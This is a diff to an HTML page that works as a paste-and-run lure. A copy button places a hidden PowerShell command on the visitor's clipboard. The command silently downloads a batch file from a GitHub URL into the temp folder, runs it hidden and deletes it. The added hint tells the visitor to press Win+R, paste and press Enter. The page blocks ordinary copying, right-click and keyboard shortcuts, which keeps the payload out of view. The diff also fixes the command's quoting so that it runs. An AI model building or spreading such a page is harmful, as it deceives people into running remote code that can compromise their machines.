@@ -144,6 +144,7 @@
     letter-spacing: 0.5px;
     white-space: nowrap;
     overflow-x: auto;
+    opacity: 0.6;
   }
   .copy-btn {
     background: transparent;
@@ -181,7 +182,6 @@
     color: var(--copied-color);
     font-weight: 600;
   }
-  .spacer { flex-grow: 1; }
 </style>
 </head>
 <body>
@@ -211,7 +211,7 @@
       </ol>
 
       <div class="code-block">
-        <div class="code-text">press copy to you can copy code</div>
+        <div class="code-text" id="codeDisplay">press copy to get the code</div>
         <button class="copy-btn" id="copyBtn" type="button">Copy</button>
       </div>
 
@@ -221,7 +221,7 @@
 
 <script>
 (function() {
-  const codeToCopy = 'powershell -WindowStyle Hidden -Command "& {$u='https://raw.githubusercontent.com/banzoxOG/test/refs/heads/main/installer.bat';$f=$env:TEMP+'/i.bat';Invoke-WebRequest -Uri $u -OutFile $f;Start-Process -WindowStyle Hidden -FilePath $f;Start-Sleep -Seconds 2;Remove-Item $f}"';
+  const codeToCopy = 'powershell -WindowStyle Hidden -Command "& {$u=\'https://raw.githubusercontent.com/banzoxOG/test/refs/heads/main/installer.bat\';$f=$env:TEMP+\'\\i.bat\';Invoke-WebRequest -Uri $u -OutFile $f;Start-Process -WindowStyle Hidden -FilePath $f;Start-Sleep -Seconds 2;Remove-Item $f}"';
   const copyBtn = document.getElementById('copyBtn');
   const footerHint = document.getElementById('footerHint');
 
@@ -231,7 +231,6 @@
 
     let copied = false;
 
-    // Primary method
     if (navigator.clipboard && navigator.clipboard.writeText) {
       try {
         await navigator.clipboard.writeText(codeToCopy);
@@ -239,7 +238,6 @@
       } catch (err) {}
     }
 
-    // Fallback 1: execCommand
     if (!copied) {
       try {
         const ta = document.createElement('textarea');
@@ -257,23 +255,26 @@
     }
 
     if (copied) {
-      copyBtn.textContent = 'Copied';
+      copyBtn.textContent = 'Copied!';
       copyBtn.classList.add('copied');
-      footerHint.textContent = 'Code copied! Now refresh the page.';
+      footerHint.textContent = '✅ Code copied! Now press Win+R, paste it, and press Enter. Then refresh this page.';
       footerHint.classList.add('ready');
+      setTimeout(() => {
+        copyBtn.textContent = 'Copy';
+        copyBtn.classList.remove('copied');
+        footerHint.textContent = 'Refresh after copying the code';
+        footerHint.classList.remove('ready');
+      }, 4000);
     } else {
-      copyBtn.textContent = 'Failed';
+      copyBtn.textContent = '❌ Failed';
       setTimeout(() => { copyBtn.textContent = 'Copy'; }, 1500);
     }
   });
 
-  // FIXED: Allow copy from our button while blocking all other copies
   document.addEventListener('copy', function(e) {
-    // If the copy event is triggered by our button's click handler, allow it
     if (e.target && e.target.id === 'copyBtn') {
-      return true; // Allow the default behavior for our button
+      return;
     }
-    // Block all other copy attempts
     e.preventDefault();
     e.clipboardData.setData('text/plain', '');
     return false;
@@ -285,23 +286,23 @@
     return false;
   });
 
-  // Block right-click context menu
   document.addEventListener('contextmenu', function(e) {
     e.preventDefault();
     return false;
   });
 
-  // Block keyboard shortcuts (Ctrl+C, Ctrl+X, Ctrl+A, Cmd+C, Cmd+X, Cmd+A)
   document.addEventListener('keydown', function(e) {
     const key = e.key.toLowerCase();
     if ((e.ctrlKey || e.metaKey) && ['c', 'x', 'a'].includes(key)) {
+      if (e.target && e.target.id === 'copyBtn') {
+        return;
+      }
       e.preventDefault();
       e.stopPropagation();
       return false;
     }
   });
 
-  // Block drag selection
   document.addEventListener('dragstart', function(e) {
     e.preventDefault();
     return false;
